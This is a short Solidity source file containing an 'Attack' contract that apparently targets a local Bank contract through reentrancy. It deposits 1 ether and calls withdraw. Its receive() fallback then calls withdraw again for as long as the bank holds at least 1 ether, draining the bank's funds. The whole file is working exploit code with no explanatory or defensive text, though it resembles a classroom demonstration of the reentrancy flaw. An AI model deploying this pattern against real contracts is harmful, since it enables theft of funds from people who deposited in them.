pragma solidity 0.8.17;
import "./Bank.sol";

contract Attack{
    address public immutable bank;

    constructor(address _bank) {
        bank = _bank;
    }
    receive() external payable{
        //call Bank.sol withdraw function
        if(address(bank).balance >= 1 ether){
            Bank(bank).withdraw();
        }
    }

    function attack() external payable{
        Bank(bank).deposit{value: 1 ether}();
        Bank(bank).withdraw();
    }
}
